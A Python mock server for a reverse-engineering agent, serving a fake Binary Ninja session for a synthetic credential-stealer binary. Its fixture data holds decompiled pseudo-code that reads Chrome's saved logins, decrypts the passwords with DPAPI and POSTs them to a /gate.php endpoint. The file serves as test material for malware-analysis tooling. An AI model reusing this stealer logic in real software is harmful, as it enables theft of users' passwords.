"""
Mock bridge server — runs without Binary Ninja installed.

Serves a synthetic stealer-like binary session so the agent loop can be
developed and tested end-to-end on any machine.

Usage:
    python -m re_agent.bn_bridge.mock          # starts mock on :7734
    python run_agent.py --bridge http://127.0.0.1:7734 --mock
"""

from __future__ import annotations

import json
import os
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any
from urllib.parse import parse_qs, urlparse

PORT = 7734

# ── synthetic binary data ─────────────────────────────────────────────────────

SESSION = {
    "binary_name": "sample_stealer.exe",
    "binary_id": "sample_stealer.exe::sha256:aabbccdd1122",
    "arch": "x86_64",
    "platform": "windows",
    "entry_points": ["0x401000"],
    "current_address": "0x401000",
    "current_function": {"name": "start", "start": "0x401000"},
    "function_count": 87,
}

OVERVIEW = {
    "imports": [
        {"module": "ws2_32", "name": "connect", "address": "0x601010"},
        {"module": "ws2_32", "name": "send", "address": "0x601018"},
        {"module": "ws2_32", "name": "recv", "address": "0x601020"},
        {"module": "wininet", "name": "InternetOpenA", "address": "0x601028"},
        {"module": "wininet", "name": "InternetConnectA", "address": "0x601030"},
        {"module": "wininet", "name": "HttpOpenRequestA", "address": "0x601038"},
        {"module": "wininet", "name": "HttpSendRequestA", "address": "0x601040"},
        {"module": "crypt32", "name": "CryptUnprotectData", "address": "0x601048"},
        {"module": "sqlite3", "name": "sqlite3_open", "address": "0x601050"},
        {"module": "sqlite3", "name": "sqlite3_prepare_v2", "address": "0x601058"},
        {"module": "sqlite3", "name": "sqlite3_step", "address": "0x601060"},
        {"module": "advapi32", "name": "RegSetValueExA", "address": "0x601068"},
        {"module": "advapi32", "name": "RegOpenKeyExA", "address": "0x601070"},
        {"module": "kernel32", "name": "CreateProcessA", "address": "0x601078"},
        {"module": "kernel32", "name": "IsDebuggerPresent", "address": "0x601080"},
    ],
    "sections": [
        {"name": ".text", "start": "0x401000", "end": "0x430000", "size": 192512, "entropy": 6.1},
        {"name": ".data", "start": "0x430000", "end": "0x438000", "size": 32768, "entropy": 3.8},
        {"name": ".rdata", "start": "0x438000", "end": "0x440000", "size": 32768, "entropy": 4.2},
        {"name": ".rsrc", "start": "0x440000", "end": "0x448000", "size": 32768, "entropy": 7.4},
    ],
    "strings_stats": {
        "count": 312,
        "interesting": [
            "%LOCALAPPDATA%\\Google\\Chrome\\User Data",
            "Login Data",
            "SELECT origin_url, username_value, password_value FROM logins",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Content-Type: application/json",
            "/gate.php",
            "os_crypt",
            "runonce",
            "https://",
        ],
    },
    "function_stats": {
        "count": 87,
        "largest": [
            {"name": "sub_407820", "start": "0x407820", "size": 980},
            {"name": "sub_408d10", "start": "0x408d10", "size": 640},
            {"name": "sub_405120", "start": "0x405120", "size": 520},
            {"name": "sub_401500", "start": "0x401500", "size": 480},
            {"name": "sub_403000", "start": "0x403000", "size": 440},
        ],
    },
    "capability_tags": ["credential", "crypto", "network", "registry", "anti_debug"],
}

FUNCTIONS = [
    {
        "name": "sub_407820",
        "start": "0x407820",
        "size": 980,
        "basic_blocks": 32,
        "callers": 2,
        "callees": 8,
        "imports_used": ["sqlite3_open", "sqlite3_prepare_v2", "sqlite3_step"],
        "string_refs": [
            "%LOCALAPPDATA%\\Google\\Chrome\\User Data",
            "Login Data",
            "SELECT origin_url, username_value, password_value FROM logins",
        ],
        "tags": [],
        "score": {"suspicion": 9.6, "reasons": ["credential_string_hit", "sqlite_imports", "high_centrality"]},
    },
    {
        "name": "sub_408d10",
        "start": "0x408d10",
        "size": 640,
        "basic_blocks": 18,
        "callers": 3,
        "callees": 4,
        "imports_used": ["CryptUnprotectData"],
        "string_refs": [],
        "tags": [],
        "score": {"suspicion": 8.9, "reasons": ["crypto_import_hit", "called_by_credential_fn"]},
    },
    {
        "name": "sub_405120",
        "start": "0x405120",
        "size": 520,
        "basic_blocks": 21,
        "callers": 2,
        "callees": 6,
        "imports_used": ["InternetConnectA", "HttpOpenRequestA", "HttpSendRequestA"],
        "string_refs": ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Content-Type: application/json", "/gate.php"],
        "tags": [],
        "score": {"suspicion": 8.4, "reasons": ["network_import_hit", "string_hit:/gate.php"]},
    },
    {
        "name": "sub_401500",
        "start": "0x401500",
        "size": 480,
        "basic_blocks": 24,
        "callers": 1,
        "callees": 5,
        "imports_used": [],
        "string_refs": [],
        "tags": [],
        "score": {"suspicion": 5.1, "reasons": ["high_centrality", "called_from_entry"]},
    },
    {
        "name": "sub_403000",
        "start": "0x403000",
        "size": 440,
        "basic_blocks": 16,
        "callers": 1,
        "callees": 3,
        "imports_used": ["IsDebuggerPresent"],
        "string_refs": [],
        "tags": [],
        "score": {"suspicion": 7.2, "reasons": ["anti_debug_import"]},
    },
]

FUNCTION_SUMMARIES = {
    "0x407820": {
        "name": "sub_407820",
        "start": "0x407820",
        "end": "0x407be4",
        "size": 980,
        "basic_blocks": 32,
        "stack_vars": [
            {"name": "db_path", "type": "char[260]"},
            {"name": "db_handle", "type": "void*"},
            {"name": "stmt", "type": "void*"},
            {"name": "row_buf", "type": "StealerRecord*"},
        ],
        "constants": ["0x104", "0x200", "0x3a4"],
        "string_refs": [
            "%LOCALAPPDATA%\\Google\\Chrome\\User Data",
            "Login Data",
            "SELECT origin_url, username_value, password_value FROM logins",
            "os_crypt",
        ],
        "imports_used": ["sqlite3_open", "sqlite3_prepare_v2", "sqlite3_step"],
        "callees": [
            {"name": "sqlite3_open", "start": "0x601050"},
            {"name": "sqlite3_prepare_v2", "start": "0x601058"},
            {"name": "sqlite3_step", "start": "0x601060"},
            {"name": "sub_408d10", "start": "0x408d10"},
            {"name": "sub_406a00", "start": "0x406a00"},
        ],
        "callers": [
            {"name": "sub_401500", "start": "0x401500"},
        ],
        "tags": [],
        "notes": [],
    },
    "0x408d10": {
        "name": "sub_408d10",
        "start": "0x408d10",
        "end": "0x408f90",
        "size": 640,
        "basic_blocks": 18,
        "stack_vars": [
            {"name": "input_blob", "type": "DATA_BLOB"},
            {"name": "output_blob", "type": "DATA_BLOB"},
        ],
        "constants": ["0x1", "0x4000000"],
        "string_refs": [],
        "imports_used": ["CryptUnprotectData"],
        "callees": [
            {"name": "CryptUnprotectData", "start": "0x601048"},
            {"name": "LocalAlloc", "start": "0x601090"},
            {"name": "LocalFree", "start": "0x601098"},
        ],
        "callers": [
            {"name": "sub_407820", "start": "0x407820"},
            {"name": "sub_406c10", "start": "0x406c10"},
        ],
        "tags": [],
        "notes": [],
    },
    "0x405120": {
        "name": "sub_405120",
        "start": "0x405120",
        "end": "0x405328",
        "size": 520,
        "basic_blocks": 21,
        "stack_vars": [
            {"name": "hInternet", "type": "HINTERNET"},
            {"name": "hConnect", "type": "HINTERNET"},
            {"name": "hRequest", "type": "HINTERNET"},
            {"name": "post_buf", "type": "char*"},
            {"name": "post_len", "type": "int"},
        ],
        "constants": ["0x50", "0x1"],
        "string_refs": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Content-Type: application/json",
            "/gate.php",
            "POST",
        ],
        "imports_used": ["InternetConnectA", "HttpOpenRequestA", "HttpSendRequestA"],
        "callees": [
            {"name": "InternetOpenA", "start": "0x601028"},
            {"name": "InternetConnectA", "start": "0x601030"},
            {"name": "HttpOpenRequestA", "start": "0x601038"},
            {"name": "HttpSendRequestA", "start": "0x601040"},
            {"name": "InternetCloseHandle", "start": "0x6010a0"},
        ],
        "callers": [
            {"name": "sub_401500", "start": "0x401500"},
        ],
        "tags": [],
        "notes": [],
    },
    "0x401500": {
        "name": "sub_401500",
        "start": "0x401500",
        "end": "0x4016e0",
        "size": 480,
        "basic_blocks": 24,
        "stack_vars": [
            {"name": "items", "type": "StealerRecord*"},
            {"name": "item_count", "type": "int"},
            {"name": "json_buf", "type": "char*"},
        ],
        "constants": ["0x1000"],
        "string_refs": [],
        "imports_used": [],
        "callees": [
            {"name": "sub_407820", "start": "0x407820"},
            {"name": "sub_406b00", "start": "0x406b00"},
            {"name": "sub_405120", "start": "0x405120"},
        ],
        "callers": [
            {"name": "start", "start": "0x401000"},
        ],
        "tags": [],
        "notes": [],
    },
}

DECOMPILE = {
    "0x407820": {
        "hlil": """\
void sub_407820(StealerRecord** out_records, int* out_count)
{
    char db_path[260];
    void* db_handle;
    void* stmt;
    int rc;

    expand_env_string("%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data", db_path, 260);
    rc = sqlite3_open(db_path, &db_handle);
    if (rc != 0)
        return;

    rc = sqlite3_prepare_v2(db_handle,
        "SELECT origin_url, username_value, password_value FROM logins",
        -1, &stmt, nullptr);

    while (sqlite3_step(stmt) == 100)  /* SQLITE_ROW */
    {
        char* url = sqlite3_column_text(stmt, 0);
        char* user = sqlite3_column_text(stmt, 1);
        void* enc_pass = sqlite3_column_blob(stmt, 2);
        int enc_len = sqlite3_column_bytes(stmt, 2);

        char* plaintext = sub_408d10(enc_pass, enc_len);  /* decrypt DPAPI blob */
        sub_406a00(out_records, out_count, url, user, plaintext);  /* append to list */
        free(plaintext);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db_handle);
}""",
        "mlil": """\
0 @ 0x407820  call expand_env_string("%LOCALAPPDATA%\\\\...", db_path, 0x104)
1 @ 0x40784a  rc = call sqlite3_open(db_path, &db_handle)
2 @ 0x407860  if (rc != 0)  goto 0x407bc0
3 @ 0x407880  rc = call sqlite3_prepare_v2(db_handle, "SELECT ...", 0xffffffff, &stmt, 0)
4 @ 0x4078b0  loop_top:
5 @ 0x4078b0  if (call sqlite3_step(stmt) != 0x64)  goto loop_end
6 @ 0x4078d0  url = call sqlite3_column_text(stmt, 0)
7 @ 0x4078f0  user = call sqlite3_column_text(stmt, 1)
8 @ 0x407910  enc = call sqlite3_column_blob(stmt, 2)
9 @ 0x407930  enc_len = call sqlite3_column_bytes(stmt, 2)
10 @ 0x407950  plain = call sub_408d10(enc, enc_len)
11 @ 0x407970  call sub_406a00(out_records, out_count, url, user, plain)
12 @ 0x407990  call free(plain)
13 @ 0x4079a0  goto loop_top
14 @ loop_end: ...""",
    },
    "0x408d10": {
        "hlil": """\
char* sub_408d10(void* enc_data, int enc_len)
{
    DATA_BLOB input_blob;
    DATA_BLOB output_blob;

    input_blob.cbData = enc_len;
    input_blob.pbData = enc_data;

    if (!CryptUnprotectData(&input_blob, nullptr, nullptr, nullptr, nullptr, 0, &output_blob))
        return nullptr;

    char* result = malloc(output_blob.cbData + 1);
    memcpy(result, output_blob.pbData, output_blob.cbData);
    result[output_blob.cbData] = 0;
    LocalFree(output_blob.pbData);
    return result;
}""",
        "mlil": """\
0 @ 0x408d10  input_blob.cbData = arg2
1 @ 0x408d1a  input_blob.pbData = arg1
2 @ 0x408d24  eax = call CryptUnprotectData(&input_blob, 0, 0, 0, 0, 0, &output_blob)
3 @ 0x408d40  if (eax == 0) goto fail
4 @ 0x408d50  result = call malloc(output_blob.cbData + 1)
5 @ 0x408d70  call memcpy(result, output_blob.pbData, output_blob.cbData)
6 @ 0x408d90  [result + output_blob.cbData] = 0
7 @ 0x408da0  call LocalFree(output_blob.pbData)
8 @ 0x408db0  return result
fail:
9 @ 0x408dc0  return 0""",
    },
    "0x405120": {
        "hlil": """\
int sub_405120(char* host, char* post_data, int post_len)
{
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                        INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    if (!hInternet)
        return -1;

    HINTERNET hConnect = InternetConnectA(hInternet, host, 80,
                                           nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/gate.php",
                                           nullptr, nullptr, nullptr, 0, 0);

    HttpAddRequestHeadersA(hRequest, "Content-Type: application/json\\r\\n", -1, HTTP_ADDREQ_FLAG_ADD);
    int ok = HttpSendRequestA(hRequest, nullptr, 0, post_data, post_len);

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return ok ? 0 : -1;
}""",
        "mlil": """\
0 @ 0x405120  hInternet = call InternetOpenA("Mozilla/5.0...", 1, 0, 0, 0)
1 @ 0x405140  if (hInternet == 0) return -1
2 @ 0x405160  hConnect = call InternetConnectA(hInternet, arg1, 0x50, 0, 0, 3, 0, 0)
3 @ 0x405190  hRequest = call HttpOpenRequestA(hConnect, "POST", "/gate.php", 0, 0, 0, 0, 0)
4 @ 0x4051c0  call HttpAddRequestHeadersA(hRequest, "Content-Type: application/json\\r\\n", 0xffffffff, 0x20000000)
5 @ 0x4051f0  ok = call HttpSendRequestA(hRequest, 0, 0, arg2, arg3)
6 @ 0x405210  call InternetCloseHandle(hRequest)
7 @ 0x405220  call InternetCloseHandle(hConnect)
8 @ 0x405230  call InternetCloseHandle(hInternet)
9 @ 0x405240  return (ok ? 0 : 0xffffffff)""",
    },
}

# ── mock state ────────────────────────────────────────────────────────────────

_notes_store: dict[str, list] = {
    "facts": [],
    "hypotheses": [],
    "unknowns": [],
    "todos": [],
    "timeline": [],
    "function_notes": {},
}
_renames: dict[str, str] = {}
_comments: dict[str, str] = {}
_objective = ""


# ── handler ───────────────────────────────────────────────────────────────────

def _ok(data: Any) -> bytes:
    return json.dumps({"ok": True, "data": data, "error": None,
                       "meta": {"binary_id": SESSION["binary_id"]}}).encode()


def _err(code: str, msg: str) -> bytes:
    return json.dumps({"ok": False, "data": None,
                       "error": {"code": code, "message": msg}}).encode()


class MockHandler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass

    def _body(self) -> dict:
        length = int(self.headers.get("Content-Length", 0))
        return json.loads(self.rfile.read(length)) if length else {}

    def _send(self, data: bytes, status: int = 200) -> None:
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")
        qs = parse_qs(parsed.query)

        if path == "/session":
            self._send(_ok(SESSION))
        elif path == "/overview":
            self._send(_ok(OVERVIEW))
        elif path == "/notes":
            self._send(_ok({
                "facts": _notes_store["facts"],
                "hypotheses": _notes_store["hypotheses"],
                "unknowns": _notes_store["unknowns"],
                "todos": _notes_store["todos"],
                "objective": _objective,
                "timeline_length": len(_notes_store["timeline"]),
            }))
        elif path == "/notes/export":
            self._send(_ok({**_notes_store, "objective": _objective,
                            "binary_id": SESSION["binary_id"]}))
        else:
            self._send(_err("NOT_FOUND", path), 404)

    def do_POST(self):
        global _objective
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")
        body = self._body()

        if path == "/functions":
            limit = body.get("limit", 30)
            fns = sorted(FUNCTIONS, key=lambda f: f["score"]["suspicion"], reverse=True)
            self._send(_ok({"total": len(fns), "cursor": limit,
                            "has_more": False, "functions": fns[:limit]}))

        elif path == "/functions/rank":
            limit = body.get("limit", 15)
            fns = sorted(FUNCTIONS, key=lambda f: f["score"]["suspicion"], reverse=True)
            self._send(_ok({"total": len(fns), "functions": fns[:limit]}))

        elif path == "/strings/search":
            q = body.get("query", "").lower()
            matches = [
                {"value": s, "address": "0x43xxxx", "refs": []}
                for s in OVERVIEW["strings_stats"]["interesting"]
                if q in s.lower()
            ]
            self._send(_ok({"matches": matches, "count": len(matches)}))

        elif path == "/imports/search":
            q = body.get("query", "").lower()
            import re
            matches = [i for i in OVERVIEW["imports"]
                       if re.search(q, i["name"] + i["module"], re.IGNORECASE)]
            self._send(_ok({"matches": matches, "count": len(matches)}))

        elif path == "/references":
            target = body.get("target", {})
            val = target.get("value", "").lower()
            refs = [
                {"kind": "string_ref", "string": s,
                 "ref_address": "0x407830", "function": "sub_407820", "function_start": "0x407820"}
                for s in OVERVIEW["strings_stats"]["interesting"]
                if val in s.lower()
            ]
            self._send(_ok({"target": target, "refs": refs[:10], "count": len(refs)}))

        elif path == "/function/summary":
            addr = body.get("function", "")
            summary = FUNCTION_SUMMARIES.get(addr)
            if not summary:
                self._send(_err("FUNCTION_NOT_FOUND", f"no function at {addr}"), 404)
            else:
                s = dict(summary)
                if addr in _renames:
                    s["name"] = _renames[addr]
                s["notes"] = _notes_store["function_notes"].get(addr, [])
                self._send(_ok(s))

        elif path == "/function/decompile":
            addr = body.get("function", "")
            view = body.get("view", "hlil")
            decomp = DECOMPILE.get(addr, {})
            text = decomp.get(view, decomp.get("hlil", "/* decompile not available */"))
            name = _renames.get(addr, FUNCTION_SUMMARIES.get(addr, {}).get("name", addr))
            self._send(_ok({
                "function": name, "start": addr, "view": view,
                "lines": text.count("\n") + 1, "text": text, "truncated": False,
            }))

        elif path == "/function/callers":
            addr = body.get("function", "")
            fn = FUNCTION_SUMMARIES.get(addr, {})
            self._send(_ok({"function": fn.get("name", addr),
                            "callers": fn.get("callers", []),
                            "count": len(fn.get("callers", []))}))

        elif path == "/function/callees":
            addr = body.get("function", "")
            fn = FUNCTION_SUMMARIES.get(addr, {})
            self._send(_ok({"function": fn.get("name", addr),
                            "callees": fn.get("callees", []),
                            "count": len(fn.get("callees", []))}))

        elif path == "/xrefs":
            addr = body.get("address", "")
            self._send(_ok({"address": addr, "refs": [], "count": 0}))

        elif path == "/bytes":
            self._send(_ok({"address": body.get("address"), "length": 16,
                            "hex": "48 8b 05 12 34 56 00 48 85 c0 74 0a ff d0 eb 00",
                            "printable": "H...4V..H..t...."}))

        elif path == "/rename":
            addr = body.get("address", "")
            new_name = body.get("new_name", "")
            fn = FUNCTION_SUMMARIES.get(addr, {})
            old_name = _renames.get(addr, fn.get("name", addr))
            preview = body.get("preview", True)
            if not preview:
                _renames[addr] = new_name
            self._send(_ok({"operation": "rename", "address": addr,
                            "old_name": old_name, "new_name": new_name,
                            "committed": not preview}))

        elif path == "/comment":
            addr = body.get("address", "")
            text = body.get("text", "")
            preview = body.get("preview", True)
            if not preview:
                _comments[addr] = text
            self._send(_ok({"operation": "comment", "address": addr,
                            "old_comment": _comments.get(addr, ""),
                            "new_comment": text, "committed": not preview}))

        elif path == "/tag":
            fn_addr = body.get("function", "")
            tag = body.get("tag", "")
            preview = body.get("preview", True)
            self._send(_ok({"operation": "tag", "function": fn_addr,
                            "new_tag": tag, "committed": not preview}))

        elif path == "/patch/preview":
            addr = body.get("address", "")
            patch = body.get("patch", "")
            self._send(_ok({"operation": "patch_preview", "address": addr,
                            "patch_hex": patch, "original_hex": "9090",
                            "original_disasm": f"{addr}: nop", "committed": False}))

        elif path == "/notes/write":
            kind = body.get("kind", "unknown")
            note = {
                "kind": kind,
                "subject": body.get("subject", ""),
                "scope": body.get("scope", "binary"),
                "text": body.get("text", ""),
                "evidence": body.get("evidence", []),
                "confidence": body.get("confidence"),
                "next_checks": body.get("next_checks", []),
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            }
            scope = body.get("scope", "binary")
            subject = body.get("subject", "")
            if scope == "function":
                _notes_store["function_notes"].setdefault(subject, []).append(note)
            else:
                _notes_store.setdefault(kind + "s", []).append(note)
            _notes_store["timeline"].append({
                "step": len(_notes_store["timeline"]) + 1,
                "action": f"write_note:{kind}",
                "subject": subject,
                "text": body.get("text", "")[:80],
                "timestamp": note["timestamp"],
            })
            self._send(_ok({"ok": True, "note": note}))

        elif path == "/notes/objective":
            _objective = body.get("objective", "")
            self._send(_ok({"ok": True, "objective": _objective}))

        else:
            self._send(_err("NOT_FOUND", path), 404)


def run(port: int = PORT) -> None:
    server = HTTPServer(("127.0.0.1", port), MockHandler)
    print(f"[mock] RE Agent bridge running on http://127.0.0.1:{port}")
    print("[mock] synthetic stealer binary loaded — no BN required")
    server.serve_forever()


if __name__ == "__main__":
    run()
